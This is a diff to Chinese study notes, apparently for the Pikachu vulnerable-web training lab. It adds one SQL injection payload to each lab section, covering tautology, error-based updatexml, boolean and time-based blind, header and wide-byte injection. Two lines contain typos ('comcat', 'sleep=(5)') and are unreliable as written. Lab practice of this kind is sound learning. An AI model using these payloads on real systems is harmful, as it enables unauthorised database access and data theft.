@@ -46,15 +46,26 @@
 	
 4、Sql Inject(SQL注入)
 	4.1 数字型注入(post)
+		id=1 or 1=1
 	4.2 字符型注入(get)
+		vince' or 1=1 -- +
 	4.3 搜索型注入
+		*' or 1=1#
 	4.4 xx型注入(这是？？？？)
+		')or 1=1#
 	4.5 insert/update注入
+		注册的提交 xxx' or updatexml(1,concat(0x7e,database()),0) or '
 	4.6 delete注入
+			get ?id=111+or+updatexml(1,comcat(0x7e,database()),0)
 	4.7 http头注入
+		User-Agent: '
 	4.8 基于boolian的盲注
+		kobe' and ascii(substr(database(),1,1))=112#
 	4.9 基于time的盲注
+		kobe' and if ((substr(database(),1,1))='a',sleep=(5),null)#
 	4.10 宽字节注入
+		1%df' or 1=1#
+		
 5、RCE
 	5.1 exec "ping"
 	5.2 exec "eval"
